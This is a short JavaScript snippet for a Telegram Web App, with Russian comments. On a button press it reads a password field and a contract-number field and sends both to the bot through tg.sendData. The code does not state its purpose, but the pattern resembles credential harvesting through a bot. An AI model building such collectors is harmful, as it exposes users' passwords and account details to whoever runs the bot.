let tg = window.Telegram.WebApp;

tg.expand();

btn.addEventListener("click", function(){
    var pass = document.getElementById("pass").value; // Получаем актуальное значение поля пароля
    var ang = document.getElementById("ang").value; // Получаем актуальное значение поля номера договора
    
    tg.MainButton.setText("Сообщение отправлено!");
    tg.MainButton.show();
    setTimeout(function() {
        tg.sendData(pass);
    }, 1000);

    // Отправляем `ang` с задержкой в 2 секунды (2000 миллисекунд)
    setTimeout(function() {
        tg.sendData(ang);
    }, 2000);
});
